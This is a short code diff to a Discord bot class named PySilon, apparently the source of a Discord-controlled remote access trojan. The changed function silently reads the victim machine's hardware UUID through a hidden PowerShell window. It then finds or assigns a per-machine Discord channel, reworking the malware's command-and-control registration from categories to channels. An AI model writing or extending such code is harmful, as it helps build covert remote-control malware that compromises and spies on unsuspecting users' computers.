@@ -40,21 +40,20 @@ class PySilon(commands.Bot):
     async def first_run_check(self) -> None:
         guild_id, guild_id_index = guild_ids[0], 0
         hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-        category_not_found = True
+        channel_not_found = True
         for _ in guild_ids:
-            for category_name in self.get_guild(guild_id).categories:
-                if hwid in str(category_name):
-                    await self.sequent_run(category_name)
-                    return
+            for channel_name in self.get_guild(guild_id).channels:
+                if hwid in str(channel_name):
+                    return await self.sequent_run(channel_name)
             if guild_id_index != len(guild_ids)-1:
                 guild_id_index += 1
                 self.guild_id = guild_ids[guild_id_index]
             else: break
 
-        if category_not_found:
+        if channel_not_found:
             for guild in guild_ids:
                 get_guild = self.get_guild(guild)
-                if len(get_guild.channels) < 495:
+                if len(get_guild.channels) < 499:
                     self.guild_id = guild
                     break
 
